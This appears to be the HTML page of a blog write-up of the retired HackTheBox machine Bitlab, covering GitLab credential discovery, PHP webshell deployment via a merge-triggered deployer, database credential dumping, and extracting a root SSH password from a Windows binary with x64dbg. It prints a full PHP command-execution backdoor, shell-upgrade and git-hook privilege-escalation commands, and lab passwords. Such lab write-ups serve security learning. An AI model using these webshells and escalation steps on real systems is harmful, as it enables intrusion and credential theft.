@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Bitlab | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/pure-min.css">
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="https://maggick.fr/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="https://maggick.fr/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="https://maggick.fr/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="https://maggick.fr/2020/01/htb-bitlab.html" title="Read more" class="entry-title-link">
+                HTB: Bitlab</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-01-11T20:40:00+01:00">11 Jan 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="https://maggick.fr/author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="https://maggick.fr/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="https://maggick.fr/tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="https://maggick.fr/tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="https://maggick.fr/tag/gitlab.html" title="Read more with the label gitlab" class="meta-link">gitlab</a> 
+          <a href="https://maggick.fr/tag/x64dbg.html" title="Read more with the label x64dbg" class="meta-link">x64dbg</a> 
+          <a href="https://maggick.fr/tag/postgresql.html" title="Read more with the label postgresql" class="meta-link">postgresql</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 7 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.01/bitlab_card.png" alt="Bitlab Card" width="262"></p>
+<p>This box is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/207">Bitlab</a>.
+This box is rated as a medium box. It implies a gitlab, a user, some
+enumeration, a PostgreSQL database, some pain with a b64 password and some basic
+reverse engineering on a Windows binary.</p>
+<p><em>If you just want to work in the binary it is available in the
+"RemoteConnection.exe" part.</em></p>
+
+
+<div class="toc">
+<ul>
+<li><a href="#getting-user">Getting user</a><ul>
+<li><a href="#recon">Recon</a></li>
+<li><a href="#web">Web</a></li>
+<li><a href="#gitlab-unauthenticated">Gitlab unauthenticated</a></li>
+<li><a href="#gitlab-authenticated">Gitlab authenticated</a></li>
+<li><a href="#postgresql">Postgresql</a></li>
+</ul>
+</li>
+<li><a href="#getting-root">Getting root</a><ul>
+<li><a href="#remoteconnectionexe">RemoteConnection.exe</a></li>
+<li><a href="#x64dbg">x64dbg</a></li>
+</ul>
+</li>
+<li><a href="#wrapping-up">Wrapping up</a></li>
+</ul>
+</div>
+<h1 id="getting-user">Getting user</h1>
+<h2 id="recon">Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan. Only the ports 22 (SSH) and 80 (HTTP)
+are open:</p>
+<div class="highlight"><pre><span class="code-line"><span></span># Nmap 7.80 scan initiated Mon Nov 25 13:23:49 2019 as: nmap -p- -oA nmap 10.10.10.114</span>
+<span class="code-line">Nmap scan report for 10.10.10.114</span>
+<span class="code-line">Host is up (0.099s latency).</span>
+<span class="code-line">Not shown: 65533 filtered ports</span>
+<span class="code-line">PORT   STATE SERVICE</span>
+<span class="code-line">22/tcp open  ssh</span>
+<span class="code-line">80/tcp open  http</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Mon Nov 25 13:26:14 2019 -- 1 IP address (1 host up) scanned in 145.18 seconds</span>
+</pre></div>
+
+
+<h2 id="web">Web</h2>
+<p>The home page is a <a href="https://about.gitlab.com/">gitlab</a> home page.</p>
+<p>We run a <a href="https://tools.kali.org/web-applications/dirb">dirb</a> against the home
+page and discover a few pages and directory.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="c1">-----------------</span></span>
+<span class="code-line"><span class="n">DIRB</span> <span class="n">v2</span><span class="p">.</span><span class="mi">22</span></span>
+<span class="code-line"><span class="k">By</span> <span class="n">The</span> <span class="n">Dark</span> <span class="n">Raver</span></span>
+<span class="code-line"><span class="c1">-----------------</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">OUTPUT_FILE</span><span class="p">:</span> <span class="n">dirb</span></span>
+<span class="code-line"><span class="n">START_TIME</span><span class="p">:</span> <span class="n">Mon</span> <span class="n">Nov</span> <span class="mi">25</span> <span class="mi">13</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">27</span> <span class="mi">2019</span></span>
+<span class="code-line"><span class="n">URL_BASE</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span></span>
+<span class="code-line"><span class="n">WORDLIST_FILES</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">txt</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1">-----------------</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">GENERATED</span> <span class="n">WORDS</span><span class="p">:</span> <span class="mi">4612</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1">---- Scanning URL: http://10.10.10.114/ ----</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">explore</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">13675</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">favicon</span><span class="p">.</span><span class="n">ico</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">301</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">169</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">groups</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">302</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">100</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">help</span><span class="o">/</span></span>
+<span class="code-line"><span class="o">==&gt;</span> <span class="n">DIRECTORY</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">profile</span><span class="o">/</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">projects</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">302</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">93</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="k">public</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">13755</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">robots</span><span class="p">.</span><span class="n">txt</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">2153</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">root</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">16026</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">Root</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">302</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">90</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="k">search</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">13366</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">snippets</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">302</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">102</span><span class="p">)</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">test</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">302</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">91</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1">---- Entering directory: http://10.10.10.114/help/ ----</span></span>
+<span class="code-line"><span class="p">(</span><span class="o">!</span><span class="p">)</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Directory</span> <span class="k">IS</span> <span class="n">LISTABLE</span><span class="p">.</span> <span class="k">No</span> <span class="n">need</span> <span class="k">to</span> <span class="n">scan</span> <span class="n">it</span><span class="p">.</span></span>
+<span class="code-line">    <span class="p">(</span><span class="n">Use</span> <span class="k">mode</span> <span class="s1">&#39;-w&#39;</span> <span class="k">if</span> <span class="n">you</span> <span class="n">want</span> <span class="k">to</span> <span class="n">scan</span> <span class="n">it</span> <span class="n">anyway</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1">---- Entering directory: http://10.10.10.114/profile/ ----</span></span>
+<span class="code-line"><span class="o">+</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">114</span><span class="o">/</span><span class="n">profile</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span> <span class="p">(</span><span class="n">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="p">:</span><span class="mi">4184</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1">-----------------</span></span>
+<span class="code-line"><span class="n">END_TIME</span><span class="p">:</span> <span class="n">Mon</span> <span class="n">Nov</span> <span class="mi">25</span> <span class="mi">13</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">24</span> <span class="mi">2019</span></span>
+<span class="code-line"><span class="n">DOWNLOADED</span><span class="p">:</span> <span class="mi">9224</span> <span class="o">-</span> <span class="k">FOUND</span><span class="p">:</span> <span class="mi">12</span></span>
+</pre></div>
+
+
+<h2 id="gitlab-unauthenticated">Gitlab unauthenticated</h2>
+<p>The <code>profile</code> URL give us access to some developer ugly profile:</p>
+<p><img alt="Clave profile" src="/media/2020.01/bitlab_5.png"></p>
+<p>When looking at the main page we can see an help link linking to a directory
+listing page linking to a bookmarks page with a few bookmarks.</p>
+<p><img alt="help link" src="/media/2020.01/bitlab_1.png">
+<img alt="Directory listing" src="/media/2020.01/bitlab_2.png">
+<img alt="Last bookmark" src="/media/2020.01/bitlab_3.png"></p>
+<p>The last link as the following value.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="c">javascript:(function(){%20var%20_0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]=%20_0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]=%20_0x4b18[5];%20})()</span></span>
+</pre></div>
+
+
+<p>We use an <a href="https://lelinhtinh.github.io/de4js/">online JavaScript Deobfuscator and Unpacker</a>
+to get the link "true" value:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="c">javascript: (function () {</span></span>
+<span class="code-line"><span class="c">    % 20</span></span>
+<span class="code-line"><span class="c">    var % 20 _0x4b18 = [&quot;value&quot;, &quot;user_login&quot;, &quot;getElementById&quot;, &quot;clave&quot;, &quot;user_password&quot;, &quot;11des0081x&quot;];</span></span>
+<span class="code-line"><span class="c">    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = % 20 _0x4b18[3];</span></span>
+<span class="code-line"><span class="c">    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = % 20 _0x4b18[5]; % 20</span></span>
+<span class="code-line"><span class="err">})()</span></span>
+</pre></div>
+
+
+<p>The credentials "clave" and "11des0081x" allow us to connect to the gitlab. We
+have access to two projects owned by the "administrator" user: "Profile" and
+"Deployer".</p>
+<p><img alt="Connected user" src="/media/2020.01/bitlab_4.png"></p>
+<h2 id="gitlab-authenticated">Gitlab authenticated</h2>
+<p>The first project is the developer profile seen earlier. The second project is
+the code use to deploy the first project using the following PHP syntax:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="x">if ($repo==&#39;Profile&#39; &amp;&amp; $branch==&#39;master&#39; &amp;&amp; $event==&#39;merge_request&#39; &amp;&amp; $state==&#39;merged&#39;) {</span></span>
+<span class="code-line"><span class="x">    echo shell_exec(&#39;cd ../profile/; sudo git pull&#39;),&quot;\n&quot;;</span></span>
+<span class="code-line"><span class="x">}</span></span>
+</pre></div>
+
+
+<p>We can add a PHP simple reverse shell (the one in
+<code>/usr/share/webshells/php/simple-backdoor.php</code> on Kali), make a pull request and
+merge it from the gitlab interface.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="x">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="cp">&lt;?php</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])){</span></span>
+<span class="code-line">        <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span></span>
+<span class="code-line">        <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span></span>
+<span class="code-line">        <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span></span>
+<span class="code-line">        <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span></span>
+<span class="code-line">        <span class="k">die</span><span class="p">;</span></span>
+<span class="code-line"><span class="p">}</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="cp">?&gt;</span><span class="x"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="x">Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="x">&lt;!--    http://michaeldaw.org   2006    --&gt;</span></span>
+</pre></div>
+
+
+<p><img alt="Adding some PHP file" src="/media/2020.01/bitlab_6.png"></p>
+<p>We then use the "Deployer" by accessing the <code>http://10.10.10.114/deployer/</code> URL
+and we can access our webshell with the <code>http://10.10.10.114/profile/cmd2.php</code>
+URL.</p>
+<p>We can also deploy a reverse shell (from
+<code>/usr/share/webshell/php/reverse-shell.php</code> for instance) and  get a shell as <code>www-data</code>
+We can use <code>python -c 'import pty; pty.spawn("/bin/sh")'</code> in order to get a
+interactive shell. We start enumerating the box and something interesting come
+out: Our user as a <code>sudo</code> permission with no password for <code>/usr/bin/git pull</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span>$ sudo -l</span>
+<span class="code-line">sudo -l</span>
+<span class="code-line">Matching Defaults entries <span class="k">for</span> www-data on bitlab:</span>
+<span class="code-line">    env_reset, <span class="nv">exempt_group</span><span class="o">=</span>sudo, mail_badpass,</span>
+<span class="code-line">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User www-data may run the following commands on bitlab:</span>
+<span class="code-line">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/git pull</span>
+</pre></div>
+
+
+<p>My first idea was to try <code>sudo /usr/bin/git pull --help</code> to get the pager as
+root but that doesn't work. The second idea was to create a new git repository
+and play with the post-merge hooks but I didn't had the right to create a new
+git project. It seems like a dead end.</p>
+<div class="highlight"><pre><span class="code-line"><span></span>$ cd /var/www/html</span>
+<span class="code-line">$ ls</span>
+<span class="code-line">deployer</span>
+<span class="code-line">help</span>
+<span class="code-line">index.html</span>
+<span class="code-line">profile</span>
+<span class="code-line">$ cp -r profile /tmp/poi</span>
+<span class="code-line">$ cd /tmp/poi</span>
+<span class="code-line">$ cd .git/hooks/</span>
+<span class="code-line">$ echo &#39;#!/bin/bash&#39; &gt;&gt; post-merge</span>
+<span class="code-line">$ echo &#39;cat /root/root.txt&#39; &gt;&gt; post-merge</span>
+<span class="code-line">$ chmod +x post-merge</span>
+<span class="code-line">$ sudo /usr/bin/git pull</span>
+<span class="code-line">fatal: this operation must be run in a work tree</span>
+</pre></div>
+
+
+<h2 id="postgresql">Postgresql</h2>
+<p>By exploring more the gitlab we can found a "snippet" name "Postgresql" containing
+the base of PHP script to connect to the database.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="cp">&lt;?php</span></span>
+<span class="code-line"><span class="nv">$db_connection</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;</span><span class="p">);</span></span>
+<span class="code-line"><span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_query</span><span class="p">(</span><span class="nv">$db_connection</span><span class="p">,</span> <span class="s2">&quot;SELECT * FROM profiles&quot;</span><span class="p">);</span></span>
+</pre></div>
+
+
+<p>We complete the script to display the database content.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="cp">&lt;?php</span></span>
+<span class="code-line"><span class="nv">$db_connection</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;</span><span class="p">);</span></span>
+<span class="code-line"><span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_query</span><span class="p">(</span><span class="nv">$db_connection</span><span class="p">,</span> <span class="s2">&quot;SELECT * FROM profiles&quot;</span><span class="p">);</span></span>
+<span class="code-line"><span class="nv">$numrows</span> <span class="o">=</span> <span class="nx">pg_numrows</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span></span>
+<span class="code-line"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$numrows</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span></span>
+<span class="code-line"><span class="p">{</span></span>
+<span class="code-line">    <span class="nv">$row</span> <span class="o">=</span> <span class="nb">pg_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span></span>
+<span class="code-line">    <span class="k">echo</span> <span class="s2">&quot;id: &quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span></span>
+<span class="code-line">    <span class="k">echo</span> <span class="s2">&quot;user: &quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span></span>
+<span class="code-line">    <span class="k">echo</span> <span class="s2">&quot;pass: &quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span></span>
+<span class="code-line"><span class="p">}</span></span>
+<span class="code-line"><span class="cp">?&gt;</span><span class="x"></span></span>
+</pre></div>
+
+
+<p>We then deploy it and execute it. The content of the database is
+<code>id: 1user: clavepass: c3NoLXN0cjBuZy1wQHNz==</code>
+Decoding the base64 password give an error as the padding is wrong.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="err">echo -ne &#39;c3NoLXN0cjBuZy1wQHNz&#39; | base64 -d</span></span>
+<span class="code-line"><span class="err">ssh-str0ng-p@ss</span></span>
+</pre></div>
+
+
+<p>The decoded password do not work. But using the base64 password is working
+(<strong>WHY WOULD YOU DO THAT?!</strong> this can be a complete brainfuck). We
+can then connect to the box as clave using SSH and get the user flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="n">ssh</span> <span class="n">clave</span><span class="mf">@10.10.10.114</span></span>
+<span class="code-line"><span class="n">clave</span><span class="mf">@10.10.10.114</span><span class="err">&#39;</span><span class="n">s</span> <span class="nl">password</span><span class="p">:</span></span>
+<span class="code-line"><span class="n">Last</span> <span class="nl">login</span><span class="p">:</span> <span class="n">Tue</span> <span class="n">Nov</span> <span class="mi">26</span> <span class="mo">07</span><span class="o">:</span><span class="mi">17</span><span class="o">:</span><span class="mi">40</span> <span class="mi">2019</span> <span class="n">from</span> <span class="mf">10.10.15.35</span></span>
+<span class="code-line"><span class="n">clave</span><span class="p">@</span><span class="nl">bitlab</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span></span>
+<span class="code-line"><span class="n">RemoteConnection</span><span class="p">.</span><span class="n">exe</span>  <span class="n">user</span><span class="p">.</span><span class="n">txt</span></span>
+<span class="code-line"><span class="n">clave</span><span class="p">@</span><span class="nl">bitlab</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span></span>
+<span class="code-line"><span class="mf">1e3</span><span class="n">fd8</span><span class="o">&lt;</span><span class="n">redacted</span><span class="o">&gt;</span></span>
+</pre></div>
+
+
+<h1 id="getting-root">Getting root</h1>
+<h2 id="remoteconnectionexe">RemoteConnection.exe</h2>
+<p>If you just want to work on the binary, it is available
+<a href="/media/2020.01/RemoteConnection.exe">here</a>.</p>
+<p>A <code>RemoteConnection.exe</code> binary is available in <code>clave</code>'s home folder.
+We copy it on our local system. It effectively a 32 bits Windows binary.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="err">file RemoteConnection.exe</span></span>
+<span class="code-line"><span class="err">RemoteConnection.exe: PE32 executable (console) Intel 80386, for MS Windows</span></span>
+</pre></div>
+
+
+<p>We can run <code>strings</code> in order to find an hard coded password but this is not the
+case here.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="err">strings RemoteConnection.exe </span></span>
+<span class="code-line"><span class="err">!This program cannot be run in DOS mode.</span></span>
+<span class="code-line"><span class="err">Rich</span></span>
+<span class="code-line"><span class="err">.text</span></span>
+<span class="code-line"><span class="err">`.rdata</span></span>
+<span class="code-line"><span class="err">@.data</span></span>
+<span class="code-line"><span class="err">.rsrc</span></span>
+<span class="code-line"><span class="err">@.reloc</span></span>
+<span class="code-line"><span class="err">M$SR</span></span>
+<span class="code-line"><span class="err">u$9U8s</span></span>
+<span class="code-line"><span class="err">hL2@</span></span>
+<span class="code-line"><span class="err">hY(@</span></span>
+<span class="code-line"><span class="err"> hL2@</span></span>
+<span class="code-line"><span class="err">Y_^[</span></span>
+<span class="code-line"><span class="err">SVWP</span></span>
+<span class="code-line"><span class="err">h,2@</span></span>
+<span class="code-line"><span class="err">Y_^[</span></span>
+<span class="code-line"><span class="err">h\2@</span></span>
+<span class="code-line"><span class="err">hL2@</span></span>
+<span class="code-line"><span class="err">=x@@</span></span>
+<span class="code-line"><span class="err">=|@@</span></span>
+<span class="code-line"><span class="err">&lt;SNIP&gt;</span></span>
+</pre></div>
+
+
+<p>We boot a Windows Box (That is the first time that I boot a Windows box for a
+HTB challenge) and run the binary in it. We got a message <code>Access Denied !!</code></p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="err">&gt;RemoteConnection.exe 10.10.10.114</span></span>
+<span class="code-line"><span class="err">Access Denied !!</span></span>
+</pre></div>
+
+
+<h2 id="x64dbg">x64dbg</h2>
+<p>We load the binary in <a href="https://x64dbg.com/">x64dbg</a>.
+We run to user code (<ALT>+<F9>). Then we take a look at the strings. It seems
+that our binary use putty to establish a remote SSH connection.</p>
+<p><img alt="Strings in the binary" src="/media/2020.01/bitlab_8.png"></p>
+<p>We put a breakpoint (<F2> on the <code>Access Denied !!</code> string).</p>
+<p><img alt="Breaking on &quot;Access Denied&quot;" src="/media/2020.01/bitlab_9.png"></p>
+<p>And we execute the program (it will automatically stop at our breakpoint). We
+can see that we got the options for putty:
+<code>005EF708  02533678  "-ssh root@gitlab.htb -pw \"Qf7]8YSV.wDNF*[7d?j&amp;eD4^\""</code>.
+We directly use the password to connect as root on the box and get the flag.</p>
+<p><img alt="The putty options at our breakpoint" src="/media/2020.01/bitlab_10.png"></p>
+<p>root@kalili:~# ssh root@10.10.10.114
+root@10.10.10.114's password:
+Last login: Tue Nov 26 10:41:25 2019 from 10.10.15.142
+root@bitlab:~# cat /root/root.txt
+8d4cc13<redacted></p>
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>This box was interesting. The base64 password was a pain but still the user part
+was quit realist as a lot of companies have some code versioning and CI tools
+(gitlab, gogs, jenkins) the root part
+was interesting at it implies some basic reverse engineering.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="https://maggick.fr/2020/01/htb-craft.html"> HTB: Craft </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
